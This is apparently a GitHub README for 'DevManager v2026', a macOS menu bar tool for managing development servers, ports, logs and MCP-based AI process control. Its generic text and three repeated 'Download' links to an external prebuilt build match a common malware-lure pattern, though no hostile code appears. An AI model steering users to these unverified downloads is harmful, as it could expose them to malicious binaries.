# DevManager v2026 - macOS Development Process Manager

> **DevManager is a native macOS menu bar utility for managing local development processes. It combines live server output, system resource monitoring, port availability checks, conflict detection, and MCP-powered process control in one up-to-date release.**

[![Platform](https://img.shields.io/badge/Platform-macOS-blue?style=flat-square)](https://github.com)
[![Version](https://img.shields.io/badge/Version-v2026-green?style=flat-square)](https://github.com)
[![Updated](https://img.shields.io/badge/Updated-2026-red?style=flat-square)](https://github.com)
[![License](https://img.shields.io/badge/License-GPL--3.0-yellow?style=flat-square)](LICENSE)
[![Stars](https://img.shields.io/github/stars/henryrjbennett4328/devmanager-dev-process?style=flat-square)](https://github.com/henryrjbennett4328/devmanager-dev-process)

---

<p align="center">
  <a href="https://henryrjbennett4328.github.io/devmanager-dev-process/">
    <img src="https://img.shields.io/badge/Download-DevManager%20Latest-brightgreen?style=for-the-badge" alt="Download DevManager">
  </a>
</p>

> **[Download DevManager v2026](https://henryrjbennett4328.github.io/devmanager-dev-process/)**

---

[Download Latest Build](https://henryrjbennett4328.github.io/devmanager-dev-process/)

---

## Overview

DevManager gives macOS developers a compact control center for local services. Rather than moving between terminal windows, browser tabs, and separate monitoring utilities, you can inspect and manage development processes directly from a menu bar application built for fast everyday decisions.

The app is useful for projects that run several services at once, require frequent port checks, or use automated local workflows. Sparkle update support, quick-launch access, and MCP-based AI control let DevManager complement an existing development environment without disrupting it.

---

## What It Provides

- Color-coded, continuously updated logs for quickly reading server output
- CPU and memory usage information for active processes
- Port readiness checks that show when services are available
- Detection of local development port collisions
- LAN QR codes for opening services quickly from devices on the same network
- A quick-launch palette for finding and opening development tools
- Start profiles that bring related process groups up together
- MCP connectivity for AI tools that need to operate development processes
- Sparkle support for automatic application updates

---

## Getting Started

You can build DevManager from the repository by cloning it and opening the macOS project in a SwiftUI-capable development environment.

1. Clone the repository:
   - `git clone https://github.com/henryrjbennett4328/devmanager-dev-process.git
2. Open the project in Xcode.
3. Build and run the application on macOS.
4. Start DevManager and leave it accessible from the menu bar while working.

If you prefer a packaged application, use the download link above to obtain the latest build and open it directly on macOS.

---

## Working with DevManager

After launch, select DevManager from the menu bar to inspect active local services, follow their live output, and review resource consumption without interrupting your current workflow.

Useful ways to use the app include:

- Launching a saved profile containing several development servers
- Confirming that a port is ready before visiting a local site
- Investigating port conflicts when a service fails to launch
- Opening a tool or process through the quick-launch palette
- Using a LAN QR code to access a local service from another device
- Allowing an MCP-connected assistant to perform supported process operations

For a more consistent workflow, group related services into reusable profiles and use DevManager as the central view of your local development environment.

---

## Settings and Project Configuration

DevManager uses local application settings together with saved process profiles. The app manages its runtime configuration internally, while project files define the behavior used by the macOS build.

Configuration areas commonly include:

- Profiles used to start groups of processes
- Menu bar options and quick-launch preferences
- Process observation and port monitoring settings
- Sparkle update configuration
- MCP connectivity for AI-assisted process management

When modifying the project, inspect the SwiftUI source and application configuration files responsible for these functions.

---

## System Requirements

- macOS
- A local development setup with at least one development server to manage
- Xcode when building the application from source
- SwiftUI support for the user interface
- Network access for update checks or LAN sharing functionality

---

## Frequently Asked Questions

**Can DevManager handle processes from more than one local project?**  
Yes. DevManager is intended for managing multiple local development processes, with profiles and quick-access features available to keep them organized.

**How are application updates delivered?**  
Sparkle auto update support is included, allowing releases to be delivered through the application's update workflow.

**Where does DevManager keep configuration data?**  
The app stores settings locally, with additional behavior defined by the project configuration. When customizing the application, review its app data and project files.

**How can I diagnose a server that will not start?**  
First check for a port conflict to determine whether another process is using the required port. Then inspect the affected service's live logs for more information.

**Is AI-assisted process management available?**  
Yes. MCP integration allows compatible AI tools to interact with supported process workflows.

---

## License

GNU GPL v3.0 - see [LICENSE](LICENSE) for details.
